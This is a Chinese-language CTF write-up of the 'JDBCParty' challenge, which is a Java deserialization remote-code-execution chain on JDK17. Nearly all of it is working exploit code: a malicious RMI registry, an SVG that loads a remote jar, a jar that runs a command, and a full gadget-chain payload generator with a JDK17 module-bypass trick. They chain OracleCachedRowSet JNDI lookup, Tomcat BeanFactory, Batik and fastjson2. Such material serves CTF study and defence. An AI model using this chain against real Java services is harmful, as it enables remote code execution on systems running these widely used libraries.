---
tags:
  - java安全
  - CTF
date: 2025-03-06
title: 软件攻防-JDBCParty
---

# 题目概述

主要是有一个反序列化的入口点。

```java
   @PostMapping({"/dbtest"})
   public ResponseEntity<String> dbtest(String data) {
      try {
         User credentials = (User)Utils.deserialize(data);
```

大概有这些依赖。然后java版本是jdk17

```java
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <!-- https://mvnrepository.com/artifact/com.oracle.database.jdbc/ojdbc11 -->
        <dependency>
            <groupId>com.oracle.database.jdbc</groupId>
            <artifactId>ojdbc11</artifactId>
            <version>21.14.0.0</version>
<!--            <version>21.5.0.0</version>-->
        </dependency>

        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-jdbc</artifactId>
            <version>${tomcat.version}</version>
        </dependency>

        <dependency>
            <groupId>org.apache.xmlgraphics</groupId>
            <artifactId>batik-swing</artifactId>
            <version>1.14</version>
        </dependency>

        <dependency>
            <groupId>com.alibaba.fastjson2</groupId>
            <artifactId>fastjson2</artifactId>
            <version>2.0.37</version>
        </dependency>
```

# sink

OracleCachedRowSet 类中有一个get方法可以触发jdni注入。

```java
    Connection getConnectionInternal() throws SQLException {
        if (this.connection == null || this.connection.isClosed()) {
            String var1 = this.getUsername();
            String var2 = this.getPassword();
            if (this.getDataSourceName() != null) {
                try {
                    InitialContext var3 = null;

                    try {
                        Properties var4 = System.getProperties();
                        var3 = new InitialContext(var4);
                    } catch (SecurityException var5) {
                    }

                    if (var3 == null) {
                        var3 = new InitialContext();
                    }

                    this.validateJNDIName(this.getDataSourceName());
                    DataSource var7 = (DataSource)var3.lookup(this.getDataSourceName());
```

但是这个版本对jndi注入的地方进行了一些过滤，不能使用ladp协议。我门可以尝试使用rmi协议进行攻击。（21.5.0.0这个版本是没有对ladp协议进行过滤的）

```java
    public void validateJNDIName(String var1) throws SQLException {
        if (var1 != null && !var1.isEmpty()) {
            if ((var1.toLowerCase().startsWith("ldap://") || var1.toLowerCase().startsWith("jndi://")) && !Boolean.valueOf(System.getProperty("oracle.jdbc.allowAbsoluteJNDIUrls", "false"))) {
                throw (SQLException)DatabaseError.createSqlException(this.getConnectionDuringExceptionHandling(), 360).fillInStackTrace();
            }
        } else {
            throw (SQLException)DatabaseError.createSqlException(this.getConnectionDuringExceptionHandling(), 360).fillInStackTrace();
        }
    }
```

总之就是利用 BeanFactory 调用 ELProcessor 的 eval 方法达到调命令执行的效果。还有很多其它的方法 https://tttang.com/archive/1698/

但是这个tomcat版本太高`9.0.62`后在`BeanFactory`里对`forceString` 进行了判断

然后我们换一种发放通过 BeanFactory 实现调用任意setter方法并且传参



这里还有一个依赖我们没有看到。

```xml
        <dependency>
            <groupId>org.apache.xmlgraphics</groupId>
            <artifactId>batik-swing</artifactId>
            <version>1.14</version>
        </dependency>
```



这里选择的是 JSVGCanvas 的 setURI。这个恶意的rmi server也可以用jdk8。

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class TmpJndi {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("URI", "http://127.0.0.1:7777/1.svg"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("remoteobj", referenceWrapper);
    }
}
```



这里会调用 loadSVGDocument(this.uri);

```java
    public void setURI(String newURI) {
        String oldValue = this.uri;
        this.uri = newURI;
        if (this.uri != null) {
            this.loadSVGDocument(this.uri);
        } else {
            this.setSVGDocument((SVGDocument)null);
        }

        this.pcs.firePropertyChange("URI", oldValue, this.uri);
    }
```

这个文章的末尾有提到怎么利用。

https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ

先准备好我们的恶意jar包。

http://www.java2s.com/Code/Jar/b/Downloadbatikext15jar.htm   依赖的版本较为古老。这里是下载地址。 

META-INF/MANIFEST.MF
```
Manifest-Version: 1.0  
Main-Class: Main  
SVG-Handler-Class: Main

```
build artifacts 编译生成jar包。
```java
import java.io.IOException;  
import org.w3c.dom.svg.SVGDocument;  
import org.w3c.dom.svg.EventListenerInitializer;  
public class Main implements EventListenerInitializer {  
  
    @Override  
    public void initializeEventListeners(SVGDocument svgDocument) {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
    public static void main(String[] args) {  
        System.out.println("Hello,J1rrY");  
    }  
  
}
```

1.svg

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="application/java-archive" xlink:href="http://127.0.0.1:7777/SVGpoc2.jar">
    </script>
</svg>
```

# source2sink

readObject -> toString   这个gadget这里试了两个都是可行的。

toString -> OracleCachedRowSet.getter

这个getProxy就是为了让getter稳定触发。

```java
package com.example.jdbcparty;

import com.alibaba.fastjson2.JSONArray;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.fasterxml.jackson.databind.node.POJONode;
import oracle.jdbc.rowset.OracleCachedRowSet;
import org.springframework.aop.framework.AdvisedSupport;
import sun.misc.Unsafe;
import sun.reflect.ReflectionFactory;

import javax.sql.RowSetInternal;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.*;

public class OracleJdbc2 {

    public static void main(String[] args) throws Exception {

        unsafe_break_jdk17();
        // sink
        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();
        oracleCachedRowSet.setDataSourceName("rmi://127.0.0.1:1097/remoteobj");

        Object proxy = getProxy(oracleCachedRowSet);
        JSONArray objects = new JSONArray();
        objects.add(proxy);

        Hashtable hashMapXStringToString = makeTableTstring(objects);

//        EventListenerList list = new EventListenerList();
//        UndoManager manager = new UndoManager();
//        Vector vector = (Vector) getFieldValue(manager, "edits");
//        vector.add(objects);
//        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
//        String serialize = serialize(list);

        String serialize = serialize(hashMapXStringToString);
        System.out.println(serialize);
        Object deserialize = deserialize(serialize);

    }

    public static void unsafe_break_jdk17() throws Exception {
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        //获取Object的module
        Module objectmodule = Object.class.getModule();
        //获取当前类对象
        Class mainClass = OracleJdbc2.class;
        //获取在class中module的偏移量
        long module = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        //设置module
        unsafe.getAndSetObject(mainClass,module,objectmodule);
    }

    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(obj);
        String payload = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        return payload;
    }

    public static Object deserialize(String payload) throws Exception {
        byte[] data = Base64.getDecoder().decode(payload);
        return new ObjectInputStream(new ByteArrayInputStream(data)).readObject();
    }
    //反射改值
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getSuperclass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static Object getProxy(Object obj) throws Exception{
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{RowSetInternal.class}, handler);
        return proxyObj;
    }

    //hashtable.readObject  ---> TextAndMnemonicHashMap.get ----> obj.toString
    public static Hashtable makeTableTstring(Object o) throws Exception{
        Map tHashMap1 = (HashMap) createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (HashMap) createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        setValue(tHashMap1,"loadFactor",1);
        setValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}
```

> 其实很奇怪，我本来想把这个写的更加通俗易懂一些的。但是遇到高阶但我又比较熟悉的一些的点，我就不想去多解释了。连个参考也不想帖了。

附件在这里，我只剩下这个反编译好的jar了。https://github.com/C0cr/CTF-Repo
